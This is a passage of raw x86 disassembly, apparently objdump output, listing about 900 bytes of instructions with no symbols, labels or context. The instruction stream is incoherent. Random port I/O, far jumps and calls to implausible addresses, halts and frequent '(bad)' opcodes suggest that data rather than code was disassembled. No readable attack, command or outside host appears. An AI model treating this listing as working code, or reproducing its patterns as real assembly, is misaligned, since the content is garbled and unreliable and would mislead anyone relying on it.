  419142:	mov    ah,0xa1
  419144:	fild   DWORD PTR [edx-0x1a5d78ff]
  41914a:	xor    DWORD PTR [edi+0x4],0x6c93172b
  419151:	push   eax
  419152:	fnstcw WORD PTR [edx-0x65]
  419155:	pop    esp
  419156:	fimul  WORD PTR [ecx-0x4ca5222f]
  41915c:	jb     0x4191c1
  41915e:	arpl   WORD PTR [ecx+0x46],si
  419161:	in     al,dx
  419162:	hlt    
  419163:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419164:	cmp    DWORD PTR [ebx],esi
  419166:	pop    ds
  419167:	and    edx,esp
  419169:	sbb    eax,0xfe7b70b6
  41916e:	in     eax,0x18
  419170:	xchg   BYTE PTR [eax],al
  419172:	xchg   esi,eax
  419173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419174:	shl    BYTE PTR [esi-0x7cdf1504],cl
  41917a:	fdiv   DWORD PTR [ecx+0x10]
  41917d:	icebp  
  41917e:	lods   eax,DWORD PTR ds:[esi]
  41917f:	add    al,BYTE PTR [edi]
  419181:	mov    esp,0x90e98709
  419186:	stos   DWORD PTR es:[edi],eax
  419187:	add    al,0xfc
  419189:	pusha  
  41918a:	pop    ecx
  41918b:	mov    ch,0x92
  41918d:	jmp    0xac48bb29
  419192:	dec    esi
  419193:	xchg   edx,eax
  419194:	sub    DWORD PTR [edi-0x5],esp
  419197:	mov    esp,0x1e9bcc05
  41919c:	xchg   ecx,eax
  41919d:	lock mov DWORD PTR [edi-0x35e9be48],ecx
  4191a4:	cli    
  4191a5:	ss inc esp
  4191a7:	mov    bl,BYTE PTR cs:[ecx+edx*4]
  4191ab:	jg     0x4191b4
  4191ad:	test   al,0xfa
  4191af:	mov    cl,0x0
  4191b1:	enter  0xc908,0xac
  4191b5:	test   al,0xa4
  4191b7:	xchg   DWORD PTR [ecx+0x55],ecx
  4191ba:	jp     0x419201
  4191bc:	mov    eax,0x3f9f00a0
  4191c1:	mov    ebp,0xd5017cca
  4191c6:	call   0xf1f12aa5
  4191cb:	in     eax,dx
  4191cc:	in     eax,dx
  4191cd:	out    0x68,al
  4191cf:	sub    ch,BYTE PTR [ecx+0x3994e110]
  4191d5:	fimul  DWORD PTR ds:[edx]
  4191d8:	out    0x3d,eax
  4191da:	lahf   
  4191db:	gs or  eax,edx
  4191de:	jmp    0x419187
  4191e0:	fiadd  DWORD PTR [eax+esi*8]
  4191e3:	xor    eax,0xb1bc7b0d
  4191e8:	xchg   edi,eax
  4191e9:	cmp    dh,0xc5
  4191ec:	pop    ecx
  4191ed:	fstp   TBYTE PTR [edx-0x4f7bae1a]
  4191f3:	pop    ds
  4191f4:	and    al,0xd9
  4191f6:	das    
  4191f7:	xor    eax,DWORD PTR [eax+0x7776c688]
  4191fd:	les    edi,FWORD PTR [ebp+0x743bd]
  419203:	outs   dx,DWORD PTR ds:[esi]
  419204:	jmp    0x9e5a:0xd61f49ed
  41920b:	fnstsw WORD PTR [eax+0x61fbd9e7]
  419211:	adc    ecx,DWORD PTR [esi-0x246e3aa4]
  419217:	adc    edi,edi
  419219:	fwait
  41921a:	or     esi,DWORD PTR [esi-0x79098c0a]
  419220:	sahf   
  419221:	push   esp
  419222:	xchg   ebp,eax
  419223:	(bad)  
  419224:	xchg   ebx,eax
  419225:	cmp    dl,dl
  419227:	(bad)  
  419228:	loope  0x41929f
  41922a:	inc    esi
  41922b:	fistp  DWORD PTR [edx]
  41922d:	push   ss
  41922e:	jno    0x419250
  419230:	mov    esi,0x4c85723c
  419235:	or     al,BYTE PTR [edi]
  419237:	mov    ecx,0x2967db7c
  41923c:	mov    dl,0x5
  41923e:	jb     0x419285
  419240:	pushf  
  419241:	sub    bl,BYTE PTR ds:0xfd8b11e4
  419247:	xor    ecx,DWORD PTR [edx]
  419249:	(bad)  
  41924a:	or     al,0xb5
  41924c:	mul    DWORD PTR [eiz*1-0x6ea685c6]
  419253:	neg    cl
  419255:	inc    edi
  419256:	test   al,0x8b
  419258:	jno    0x41922e
  41925a:	lahf   
  41925b:	add    al,BYTE PTR [ebx+0x1706fc6b]
  419261:	cmp    al,0xbe
  419263:	mov    ah,0x9c
  419265:	(bad)  
  419266:	cmp    al,0xb8
  419268:	dec    ebx
  419269:	pushf  
  41926a:	neg    DWORD PTR [ebp-0x17]
  41926d:	(bad)  
  41926e:	hlt    
  41926f:	xor    ecx,DWORD PTR [ebx+0x4]
  419272:	mov    ebx,0xbb00c4d9
  419277:	cli    
  419278:	enter  0xaef8,0x5b
  41927c:	rol    bl,0xfb
  41927f:	ja     0x41923e
  419281:	cmp    al,0x2
  419283:	imul   ebx,DWORD PTR [ecx],0xffffff94
  419286:	leave  
  419287:	stos   BYTE PTR es:[edi],al
  419288:	std    
  419289:	ins    BYTE PTR es:[edi],dx
  41928a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41928c:	retf   
  41928d:	xor    esi,edx
  41928f:	xlat   BYTE PTR ds:[ebx]
  419290:	in     eax,0xf2
  419292:	outs   dx,BYTE PTR ds:[esi]
  419293:	push   esp
  419294:	inc    eax
  419295:	mov    al,ds:0xd85277ad
  41929a:	cmp    DWORD PTR [esi+0x3d],edx
  41929d:	popa   
  41929e:	push   edx
  41929f:	xor    bl,BYTE PTR [ecx+0x6c]
  4192a2:	data16 ins BYTE PTR es:[edi],dx
  4192a4:	xor    eax,0x773c5079
  4192a9:	pop    edi
  4192aa:	(bad)  
  4192ab:	std    
  4192ac:	call   0x6c4349ed
  4192b1:	mov    WORD PTR [ebp-0x29],cx
  4192b5:	ror    BYTE PTR [edx+0x67],0xa0
  4192b9:	adc    DWORD PTR [esi-0x690021c1],eax
  4192bf:	jns    0x41930b
  4192c1:	inc    esp
  4192c2:	sbb    al,ch
  4192c4:	daa    
  4192c5:	test   BYTE PTR [eax+0x5],bl
  4192c8:	mov    ds:0x15c7e8a0,eax
  4192cd:	fidivr DWORD PTR [eax-0x63]
  4192d0:	loope  0x41928d
  4192d2:	fnstsw WORD PTR [ecx]
  4192d4:	push   eax
  4192d5:	inc    edi
  4192d6:	xchg   ecx,eax
  4192d7:	mov    DWORD PTR [esi+ebx*4],esi
  4192da:	xor    ebp,DWORD PTR [ecx-0x14]
  4192dd:	push   0xffffffb2
  4192df:	jge    0x419272
  4192e1:	lea    edx,[ebp+0x1b]
  4192e4:	ins    DWORD PTR es:[edi],dx
  4192e5:	scas   eax,DWORD PTR es:[edi]
  4192e6:	sub    ebp,DWORD PTR ds:0x4b9d21fb
  4192ec:	fstp   TBYTE PTR [ebp+0x13bb2fde]
  4192f2:	add    BYTE PTR [edx],0x39
  4192f5:	cmc    
  4192f6:	out    0x7f,al
  4192f8:	out    0xee,eax
  4192fa:	arpl   WORD PTR [esi-0x414316bc],sp
  419300:	popa   
  419301:	sub    al,0x5b
  419303:	idiv   BYTE PTR [ebp-0x42804775]
  419309:	rol    DWORD PTR ds:0x11893afb,0x8f
  419310:	jnp    0x4192d4
  419312:	lods   al,BYTE PTR ds:[esi]
  419313:	test   BYTE PTR [ecx+0x54],dl
  419316:	add    ebp,esp
  419318:	retf   
  419319:	push   esi
  41931a:	imul   esi,DWORD PTR [eax-0x52],0xffffffd7
  41931e:	push   eax
  41931f:	push   ebx
  419320:	add    BYTE PTR [esi+0x54],dl
  419323:	cmp    dl,BYTE PTR [ecx+0x680511b4]
  419329:	mov    edi,0x290e29d3
  41932e:	not    BYTE PTR [ecx]
  419330:	jmp    0xae1905e4
  419335:	retf   0x9d2d
  419338:	(bad)  [esi+eiz*4-0x77]
  41933c:	iret   
  41933d:	jno    0x419390
  41933f:	outs   dx,DWORD PTR cs:[esi]
  419341:	aaa    
  419342:	jecxz  0x4193ad
  419344:	fidiv  DWORD PTR [eax-0x1a]
  419347:	shl    dh,cl
  419349:	dec    ebx
  41934a:	inc    ebx
  41934b:	jl     0x41930d
  41934d:	jo     0x419354
  41934f:	stc    
  419350:	lods   al,BYTE PTR ds:[esi]
  419351:	pusha  
  419352:	or     DWORD PTR [ecx+0x0],esp
  419355:	fidiv  DWORD PTR [esi+0x77eabab3]
  41935b:	push   0x20529012
  419360:	out    0xe,al
  419362:	ins    BYTE PTR es:[edi],dx
  419363:	xor    ch,BYTE PTR [esi+0x9fd187f]
  419369:	mov    ebx,0xe77f74e4
  41936e:	std    
  41936f:	pop    ds
  419370:	aas    
  419371:	aad    0x65
  419373:	icebp  
  419374:	mov    ebp,0xfe251111
  419379:	bound  ebx,QWORD PTR [ecx+0x13e254c3]
  41937f:	bound  ebx,QWORD PTR [bx-0x5276]
  419384:	je     0x41933a
  419386:	cmp    ch,BYTE PTR [ecx+0x5e]
  419389:	fisub  DWORD PTR [edi-0x76]
  41938c:	mov    dh,0xcf
  41938e:	or     DWORD PTR [esi+edx*4-0x36],ebp
  419392:	add    al,0xa9
  419394:	push   cs
  419395:	loopne 0x41939d
  419397:	jno    0x41934f
  419399:	clc    
  41939a:	cmp    BYTE PTR [edx],ah
  41939c:	add    DWORD PTR [ebp-0x52af4547],esp
  4193a2:	(bad)  
  4193a3:	mov    edx,0x29bc10ff
  4193a8:	and    al,0x86
  4193aa:	je     0x419355
  4193ac:	leave  
  4193ad:	outs   dx,BYTE PTR ds:[esi]
  4193ae:	pop    eax
  4193af:	test   eax,0x6c88f938
  4193b4:	and    BYTE PTR [ebx+esi*8-0x39b62b89],dl
  4193bb:	imul   ecx,DWORD PTR [edx],0xfffffffd
  4193be:	xor    al,0xa6
  4193c0:	mov    ebx,0xe3285f08
  4193c5:	(bad)  
  4193c6:	popa   
  4193c7:	inc    ebx
  4193c8:	pop    edx
  4193c9:	cmp    edi,esi
  4193cb:	or     dh,BYTE PTR [ebp+0x74]
  4193ce:	or     BYTE PTR [ebx*8-0x6afd0e9e],dl
  4193d5:	pusha  
  4193d6:	int    0xc1
  4193d8:	lods   al,BYTE PTR ds:[esi]
  4193d9:	leave  
  4193da:	xchg   esp,eax
  4193db:	inc    edi
  4193dc:	cmp    BYTE PTR [ecx+0x65],bh
  4193df:	mov    ecx,0x45c2651e
  4193e4:	data16 or BYTE PTR [edi-0x26],cl
  4193e8:	(bad)  
  4193e9:	rol    eax,cl
  4193eb:	(bad)  
  4193ec:	aad    0x4d
  4193ee:	into   
  4193ef:	pop    esi
  4193f0:	sbb    dh,0x26
  4193f3:	dec    esi
  4193f4:	push   0xa034e38d
  4193f9:	push   ebp
  4193fa:	es jo  0x41946e
  4193fd:	mov    esp,0x237d45e5
  419402:	int    0x4f
  419404:	push   ds
  419405:	xchg   ebp,eax
  419406:	pusha  
  419407:	adc    ah,BYTE PTR [edi]
  419409:	or     edi,esp
  41940b:	adc    edx,ecx
  41940d:	mov    ebp,0xc2bcf948
  419412:	xor    BYTE PTR [edx],ah
  419414:	jge    0x4193d5
  419416:	cmp    BYTE PTR [ebx-0x3d],dl
  419419:	mov    eax,0xc8bff512
  41941e:	jns    0x41943f
  419420:	(bad)  
  419421:	mov    ebx,0x80ca2fa7
  419426:	xchg   edx,eax
  419427:	aas    
  419428:	xchg   esi,eax
  419429:	adc    esp,DWORD PTR [ebp-0xdf8b8fb]
  41942f:	xchg   ecx,eax
  419430:	adc    BYTE PTR [edx-0x365f87ed],ch
  419436:	in     eax,0x8d
  419438:	lea    eax,ds:0x53d6a23e
  41943e:	js     0x4193c9
  419440:	clc    
  419441:	xor    ah,0x1e
  419444:	call   0x7bd9:0xb60fcb07
  41944b:	shl    BYTE PTR [esi-0xa],1
  41944e:	cmp    edi,0x507e6d72
  419454:	push   ds
  419455:	push   ebp
  419456:	pushf  
  419457:	scas   eax,DWORD PTR es:[edi]
  419458:	adc    cl,BYTE PTR ss:[ebx-0x60]
  41945c:	jns    0x41941f
  41945e:	call   0xedbda717
  419463:	and    bh,0xd9
  419466:	mov    edi,0xe6ec0ff2
  41946b:	add    eax,0xa3afc3db
  419470:	imul   ebx,ecx,0xa7e688c9
  419476:	or     al,0xfb
  419478:	push   es
  419479:	loopne 0x41940a
  41947b:	mov    ebx,0x4d838d23
  419480:	inc    esp
  419481:	dec    edx
  419482:	ror    DWORD PTR [eax+0x5b],cl
  419485:	xchg   BYTE PTR [ebx-0x54],al
  419488:	or     esp,DWORD PTR [edi]
  41948a:	xrelease mov DWORD PTR ds:0x30d05b4b,esi
  419491:	jg     0x419418
  419493:	lea    esp,[edi+ebx*2]
  419496:	jmp    0x929ee497
  41949b:	mov    ?,ebp
  41949d:	or     bh,dh
  41949f:	vpmacswd xmm3,xmm2,xmm7,xmm3
  4194a5:	mov    al,BYTE PTR [edx+0x9]
  4194a8:	sub    DWORD PTR [ebx],ebp
  4194aa:	imul   ecx,DWORD PTR [edi+0x4a],0x5369f3cf
  4194b1:	cmp    eax,0xdea4636d
  4194b6:	leave  
  4194b7:	fcom   QWORD PTR [edi-0x3c]
  4194ba:	ja     0x41946e
  4194bc:	xor    cl,BYTE PTR cs:[eax-0x61]
  4194c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194c1:	inc    ebx
  4194c2:	jmp    0x89a1:0xf0f5ccef
  4194c9:	aad    0x61
  4194cb:	retf   0xe2cc
  4194ce:	pop    es
  4194cf:	icebp  
  4194d0:	xchg   edx,ebx
  4194d2:	repnz out dx,eax
  4194d4:	adc    eax,ebx
  4194d6:	pop    esi
  4194d7:	push   ds
  4194d8:	movd   DWORD PTR [ebx],mm7
  4194db:	sub    cl,BYTE PTR [edi-0x44]
  4194de:	outs   dx,BYTE PTR ds:[esi]
  4194df:	fild   DWORD PTR [ebx+0x7ebf50de]
  4194e5:	daa    
  4194e6:	adc    bh,BYTE PTR [ebx]
  4194e8:	push   esi
  4194e9:	inc    edx
  4194ea:	xlat   BYTE PTR ds:[ebx]
  4194eb:	jo     0x419526
  4194ed:	dec    esp
  4194ee:	xchg   BYTE PTR [ecx],bl
  4194f0:	xchg   esp,eax
  4194f1:	dec    ebx
  4194f2:	fstp   DWORD PTR [edx+0x4539355d]
  4194f8:	inc    edi
  4194f9:	cmp    BYTE PTR [edx],dl
  4194fb:	jg     0x41955b
  4194fd:	adc    cl,dl
  4194ff:	xor    DWORD PTR [edi],eax
  419501:	cdq    
  419502:	test   ah,al
  419504:	cwde   
  419505:	jl     0x4194f7
  419507:	jmp    0xaf34:0x8d0724ff
  41950e:	loop   0x41956c
  419510:	addr16 retf 0xd94c
  419514:	mov    ah,0x90
  419516:	dec    ebx
  419517:	(bad)  
  419518:	sub    al,0x16
  41951a:	stos   DWORD PTR es:[edi],eax
  41951b:	dec    ecx
  41951c:	not    BYTE PTR [eax]
  41951e:	sbb    al,0x17
  419520:	jo     0x41950d
  419522:	sub    eax,0xcd1ce126
  419527:	adc    al,0x3a
  419529:	xchg   ebp,eax
  41952a:	jo     0x419508
  41952c:	adc    ebx,DWORD PTR [edx+0x2f]
  41952f:	bound  esi,QWORD PTR [edx]
  419531:	popf   
  419532:	mov    ds:0xebd0a76a,al
  419537:	sbb    al,0x26
  419539:	inc    ebx
  41953a:	sub    ebp,ebx
  41953c:	aad    0xa9
  41953e:	cmp    DWORD PTR [edi],edx
  419540:	into   
  419541:	mov    WORD PTR [ebx+0xd],es
  419544:	iret   
  419545:	add    al,0xbb
  419547:	gs nop
  419549:	add    dh,BYTE PTR [ebp*2-0xfaa56f7]
  419550:	rcl    DWORD PTR [edx+0x4fbd60],0xef
  419557:	lods   al,BYTE PTR ds:[esi]
  419558:	dec    ebx
  419559:	imul   eax,esp,0x8df74115
  41955f:	fmul   DWORD PTR [esi-0x7e]
  419562:	jbe    0x419565
  419564:	xchg   BYTE PTR [edi-0x2e],bh
  419567:	test   ebx,ebx
  419569:	retf   
  41956a:	mov    bh,0xd
  41956c:	fxch   st(6)
  41956e:	jne    0x41954b
  419570:	cmp    BYTE PTR [ecx+0x65],cl
  419573:	retf   0xd9c7
  419576:	rol    DWORD PTR [esi-0x69],cl
  419579:	lds    ebx,FWORD PTR [ecx]
  41957b:	test   al,0xf1
  41957d:	imul   esi,DWORD PTR [ebx+0x47],0x1
  419581:	scas   eax,DWORD PTR es:[edi]
  419582:	or     ch,BYTE PTR [edi-0x643fd4bd]
  419588:	aaa    
  419589:	mov    al,0x26
  41958b:	cwde   
  41958c:	sbb    dl,BYTE PTR [ecx-0x71881710]
  419592:	jl     0x4195a9
  419594:	mov    ebx,0x73fcccc0
  419599:	stc    
  41959a:	adc    BYTE PTR [ecx],dh
  41959c:	cli    
  41959d:	ds iret 
  41959f:	sahf   
  4195a0:	ss sbb al,0x23
  4195a3:	push   ebx
  4195a4:	jns    0x419614
  4195a6:	pop    ebx
  4195a7:	addr16 pop es
  4195a9:	pop    esp
  4195aa:	das    
  4195ab:	int    0x6
  4195ad:	imul   edx,ebp,0xffffff97
  4195b0:	adc    BYTE PTR [ebx+esi*1-0x5d],ch
  4195b4:	adc    esp,DWORD PTR [eax]
  4195b6:	mov    WORD PTR [esi-0x9ef43bd],cs
  4195bc:	mov    ds:0x8ff38994,al
  4195c1:	stc    
  4195c2:	xor    DWORD PTR [eax+0x64],esp
  4195c5:	pop    ds
  4195c6:	xlat   BYTE PTR ds:[ebx]
  4195c7:	add    DWORD PTR [edx-0x21],edx
  4195ca:	inc    esp
  4195cb:	xchg   esp,eax
  4195cc:	push   ebp
  4195cd:	xor    al,0xee
  4195cf:	aaa    
  4195d0:	push   ss
  4195d1:	mov    ds:0x2a41de4f,al
  4195d6:	pop    ss
  4195d7:	mov    ch,0xb4
  4195d9:	call   0xdfb65e93
  4195de:	mov    dl,0x51
  4195e0:	mov    WORD PTR [edi+0x4257e321],fs
  4195e6:	dec    ebp
  4195e7:	dec    edi
  4195e8:	aad    0x2f
  4195ea:	popa   
  4195eb:	leave  
  4195ec:	les    edx,FWORD PTR [ebx+edi*4-0x2b]
  4195f0:	cmp    DWORD PTR [ebp+edx*8-0x777b8ec8],edx
  4195f7:	mov    BYTE PTR [ecx],dh
  4195f9:	add    eax,0xb1bc73ff
  4195fe:	adc    al,0x63
  419600:	dec    esi
  419601:	div    ah
  419603:	ret    0x1690
  419606:	sbb    DWORD PTR [ebp-0x35],ebx
  419609:	jno    0x4195f8
  41960b:	jl     0x4195d6
  41960d:	sti    
  41960e:	adc    BYTE PTR [ebx-0x2e354e97],dh
  419614:	lock jecxz 0x41962b
  419617:	cmp    al,0xa9
  419619:	mov    edi,0xf13a595f
  41961e:	xchg   DWORD PTR [ebp+0x5f],esp
  419621:	cdq    
  419622:	out    0xea,eax
  419624:	cmp    BYTE PTR [edx+0x49],bl
  419627:	jg     0x4195c0
  419629:	fwait
  41962a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41962b:	inc    ecx
  41962c:	lahf   
  41962d:	sbb    DWORD PTR [ecx-0x3d886f72],esi
  419633:	pop    ebx
  419634:	in     eax,dx
  419635:	ret    
  419636:	test   eax,esi
  419638:	outs   dx,BYTE PTR ds:[esi]
  419639:	jp     0x4195dc
  41963b:	or     DWORD PTR [esi-0x75],edi
  41963e:	loopne 0x419661
  419640:	push   0xf77fb765
  419645:	jle    0x419665
  419647:	in     eax,dx
  419648:	stos   DWORD PTR es:[edi],eax
  419649:	add    ecx,DWORD PTR [edx-0x54]
  41964c:	lods   al,BYTE PTR ds:[esi]
  41964d:	jbe    0x41963e
  41964f:	loop   0x41965c
  419651:	xchg   BYTE PTR [ecx+0x51],bh
  419654:	gs push cs
  419656:	mov    eax,ds:0x44a0f045
  41965b:	cli    
  41965c:	sub    DWORD PTR gs:[edx],ebp
  41965f:	ffreep st(4)
  419661:	pop    ebx
  419662:	call   0xa714:0xf54ab13c
  419669:	jmp    0x648c0aa6
  41966e:	pusha  
  41966f:	cli    
  419670:	cli    
  419671:	mov    ecx,0xad36c529
  419676:	test   BYTE PTR [eax+eax*4+0x656ba4fb],cl
  41967d:	cmp    bh,al
  41967f:	jns    0x4196f4
  419681:	mov    esp,0xbb33775d
  419686:	into   
  419687:	mov    ecx,0x6eda65c3
  41968c:	sub    cl,BYTE PTR [edi]
  41968e:	ret    
  41968f:	push   eax
  419690:	push   ecx
  419691:	jb     0x41965c
  419693:	loop   0x419656
  419695:	cmp    BYTE PTR [edx+0x1926f76],dl
  41969b:	aas    
  41969c:	dec    ecx
  41969d:	pop    es
  41969e:	adc    ebx,0x5ffa6214
  4196a4:	scas   eax,DWORD PTR es:[edi]
  4196a5:	xor    DWORD PTR [ecx],0x95c3eea9
  4196ab:	(bad)  
  4196ad:	mov    edi,ebx
  4196af:	lock mov DWORD PTR [ecx+ebp*1+0x7792a900],ebp
  4196b7:	sbb    DWORD PTR [eax-0x56709713],esp
  4196bd:	daa    
  4196be:	lds    edi,FWORD PTR [ebx+ebx*8+0x4a]
  4196c2:	pop    esi
  4196c3:	xchg   esi,eax
  4196c4:	cmp    al,0xc2
  4196c6:	xchg   ebp,eax
  4196c7:	int    0xf3
  4196c9:	lock jmp 0x3d08f1d0
  4196cf:	mov    dl,0x2a
  4196d1:	test   BYTE PTR [esi-0xe],ch
  4196d4:	aaa    
  4196d5:	test   ebx,esi
  4196d7:	test   cl,bh
  4196d9:	mov    ds:0xf9b7a31,eax
  4196de:	ja     0x4196e3
  4196e0:	std    
  4196e1:	mov    al,0x5
  4196e3:	and    al,bl
  4196e5:	inc    eax
  4196e6:	sbb    bl,bl
  4196e8:	mov    DWORD PTR [edx-0x25],eax
  4196eb:	(bad)  
  4196ec:	pop    es
  4196ed:	(bad)  [ebx-0x1]
  4196f0:	and    ah,BYTE PTR [ecx]
  4196f2:	hlt    
  4196f3:	in     al,0x86
  4196f5:	out    dx,eax
  4196f6:	dec    ecx
  4196f7:	loop   0x4196d5
  4196f9:	lea    ecx,[ecx+0x263c53e8]
  4196ff:	add    BYTE PTR [edi],bh
  419701:	out    0xc4,al
  419703:	lahf   
  419704:	js     0x4196d3
  419706:	jne    0x419748
  419708:	jno    0x419721
  41970a:	mov    al,ds:0x3f43aba5
  41970f:	inc    edx
  419710:	into   
  419711:	ins    DWORD PTR es:[edi],dx
  419712:	loope  0x419759
  419714:	cli    
  419715:	loop   0x41977e
  419717:	sti    
  419718:	(bad)  
  419719:	enter  0xdd83,0x1a
  41971d:	sbb    DWORD PTR [esi],esi
  41971f:	shl    BYTE PTR [ecx],cl
  419721:	mov    gs,ebp
  419723:	cld    
  419724:	pop    esi
  419725:	sti    
  419726:	or     BYTE PTR [edi+0x31dbb83d],dl
  41972c:	jecxz  0x41978e
  41972e:	jl     0x4196c0
  419730:	cmp    DWORD PTR ds:[ecx],ecx
  419733:	push   es
  419734:	rcr    BYTE PTR [ebp+0x10],0xb9
  419738:	pmulhw mm2,QWORD PTR [edx+0x69a53d5]
  41973f:	mov    ah,BYTE PTR [ebx+ebx*1]
  419742:	or     eax,0xf6449f71
  419747:	sbb    ch,0x7d
  41974a:	mov    DWORD PTR [edi+0x5a75861a],esi
  419750:	sahf   
  419751:	scas   eax,DWORD PTR es:[edi]
  419752:	ficom  DWORD PTR [eax-0x49dbfc65]
  419758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419759:	out    dx,al
  41975a:	mov    al,0x44
  41975c:	aaa    
  41975d:	xor    esp,esi
  41975f:	adc    eax,0x7bed282f
  419764:	xchg   edx,eax
  419765:	jb     0x41978d
  419767:	fild   QWORD PTR [esi+edx*2]
  41976a:	push   esi
  41976b:	imul   esp,DWORD PTR [esp+eax*8-0x42],0x3c5dd5d6
  419773:	jg     0x41975f
  419775:	push   ebx
  419776:	les    ecx,FWORD PTR [edx]
  419778:	aas    
  419779:	jmp    0x419722
  41977b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41977c:	inc    ecx
  41977d:	push   eax
  41977f:	pop    ss
  419780:	xchg   edi,eax
  419781:	dec    esp
  419782:	rcl    DWORD PTR [esi],0x12
  419785:	(bad)  
  419786:	mov    eax,0xdbcf8f22
  41978b:	mov    eax,ds:0x6e3b5542
  419790:	imul   esi,DWORD PTR [ecx],0xe054f56b
  419796:	fstp   DWORD PTR [edi+0x37]
  419799:	pusha  
  41979a:	pop    ecx
  41979b:	bt     DWORD PTR ds:0xe74b5629,ebx
  4197a2:	retf   
  4197a3:	and    dh,BYTE PTR [eax+0x6598cfe7]
  4197a9:	xchg   esp,eax
  4197aa:	pop    ebx
  4197ab:	and    BYTE PTR [ecx+0x2df1c5d6],dl
  4197b1:	rcl    ebx,0xbd
  4197b4:	std    
  4197b5:	sub    ch,dh
  4197b7:	dec    ebx
  4197b8:	mov    BYTE PTR [esi-0x64c4b1c4],ah
  4197be:	gs mov al,0x18
  4197c1:	and    eax,0x45cf1c02
  4197c6:	test   BYTE PTR [edx+0xe],dh
  4197c9:	sbb    al,0x1a
  4197cb:	xor    BYTE PTR [eax-0x3592161d],ah
  4197d1:	lds    esp,FWORD PTR [ecx]
  4197d3:	xchg   BYTE PTR [edx+0x0],bh
  4197d6:	fsubr  DWORD PTR [edi+ebp*4+0x18e8fcb5]
  4197dd:	pop    ds
  4197de:	inc    edi
  4197df:	fdivr  st(4),st
  4197e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197e2:	sub    DWORD PTR [ecx],esi
  4197e4:	cwde   
  4197e5:	loope  0x419806
  4197e7:	jbe    0x419849
  4197e9:	mov    al,ds:0x18a9e1
  4197ee:	out    0xe,eax
  4197f0:	in     eax,0x88
  4197f2:	lea    esi,[eax-0x1328d63]
  4197f8:	mov    ch,BYTE PTR [ebx+esi*2+0x2680be9f]
  4197ff:	call   0x903c:0xc0dff08c
  419806:	or     al,0xa
  419808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419809:	sub    al,0xa7
  41980b:	stc    
  41980c:	pop    eax
  41980d:	sbb    bl,ah
  41980f:	imul   DWORD PTR [edx+ebp*8+0x51]
  419813:	mov    al,bh
  419815:	and    eax,0x1b34e2ec
  41981a:	sub    ecx,DWORD PTR [edi-0x520a13aa]
  419820:	cld    
  419821:	or     DWORD PTR [esi+0x1451b2ba],0x9a821cbd
  41982b:	out    dx,eax
  41982c:	enter  0x6aa5,0x1f
  419830:	add    dh,BYTE PTR [edi]
  419832:	xor    al,0xe3
  419834:	scas   eax,DWORD PTR es:[edi]
  419835:	lods   al,BYTE PTR ds:[esi]
  419836:	lods   eax,DWORD PTR ds:[esi]
  419837:	mov    bh,0xcc
  419839:	jb     0x4197c3
  41983b:	leave  
  41983c:	ins    DWORD PTR es:[edi],dx
  41983d:	call   0xc6b1:0xb57e1c93
  419844:	pop    esi
  419845:	lea    eax,[edi]
  419847:	(bad)  
  419848:	(bad)  [esp+ebp*2]
  41984b:	mov    ebx,0xb509a1af
  419850:	test   eax,0xbb7df8c0
  419855:	mov    esp,0x12a9c736
  41985a:	or     BYTE PTR [ecx],dh
  41985c:	fstp   QWORD PTR [edi]
  41985e:	nop
  41985f:	and    esp,DWORD PTR [eax-0x4d218382]
  419865:	adc    BYTE PTR [ecx],ah
  419867:	fmul   DWORD PTR [esi-0x21]
  41986a:	push   ebx
  41986b:	sbb    ch,ch
  41986d:	xor    BYTE PTR [eax-0x683b95dd],cl
  419873:	dec    eax
  419874:	cs sub al,0x8f
  419877:	pop    ds
  419878:	mov    al,0x2b
  41987a:	or     al,0x59
  41987c:	adc    eax,0x5ee147d2
  419881:	cmp    BYTE PTR [ebx-0x3a],cl
  419884:	xchg   ebp,eax
  419885:	dec    edi
  419886:	push   0x2b
  419888:	inc    ebp
  419889:	pushf  
  41988a:	je     0x4198c5
  41988c:	xor    edx,ebx
  41988e:	cld    
  41988f:	sub    al,0x3d
  419891:	add    cl,BYTE PTR [eax]
  419893:	push   esi
  419894:	das    
  419895:	mov    edx,0x9767c62a
  41989a:	mov    cl,0x1b
  41989c:	push   eax
  41989d:	lock and BYTE PTR [edi+eax*2+0x7d63fb1e],dh
  4198a5:	mov    ebp,DWORD PTR [edx]
  4198a7:	in     eax,dx
  4198a8:	xchg   ecx,eax
  4198a9:	jmp    0x419892
  4198ab:	push   ss
  4198ac:	xor    ecx,DWORD PTR [esi+eiz*2-0x217398e4]
  4198b3:	xor    dl,BYTE PTR [ebx-0x3c160d93]
  4198b9:	ret    0xe7b5
  4198bc:	out    0x47,al
  4198be:	mov    ah,0xec
  4198c0:	mov    al,ds:0x59a0beb3
  4198c5:	imul   ebp,DWORD PTR [esi],0xffffffb7
  4198c8:	(bad)  
  4198ca:	push   0x6a25c8e3
  4198cf:	and    eax,0xf079f8f6
  4198d4:	mov    edx,0x5fda36bf
  4198d9:	sbb    DWORD PTR [edx-0x2],esi
  4198dc:	rol    BYTE PTR [edx-0x62],cl
  4198df:	outs   dx,BYTE PTR ds:[esi]
  4198e0:	jl     0x41991e
  4198e2:	jno    0x41994f
  4198e4:	inc    ebp
  4198e5:	and    DWORD PTR [edi-0x4b80647c],esp
  4198eb:	(bad)  
  4198ec:	and    al,0xc8
  4198ee:	mov    esi,0x60d34de2
  4198f3:	jbe    0x4198df
  4198f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198f6:	pop    es
  4198f7:	sbb    edi,ebx
  4198f9:	xlat   BYTE PTR ds:[ebx]
  4198fa:	es aad 0x2a
  4198fd:	push   ds
  4198fe:	outs   dx,BYTE PTR ds:[esi]
  4198ff:	adc    eax,DWORD PTR [ecx+edi*1-0x66]
  419903:	mov    ebp,0x192d673b
  419908:	aam    0x41
  41990a:	lods   eax,DWORD PTR ds:[esi]
  41990b:	repz cmp eax,0xdde5b4df
  419911:	mov    al,0xbe
  419913:	or     BYTE PTR [ebp-0x2880322a],cl
  419919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41991a:	mov    edx,0x3407a725
  41991f:	push   ss
  419920:	int    0x12
  419922:	jbe    0x419944
  419924:	in     al,0x43
  419926:	leave  
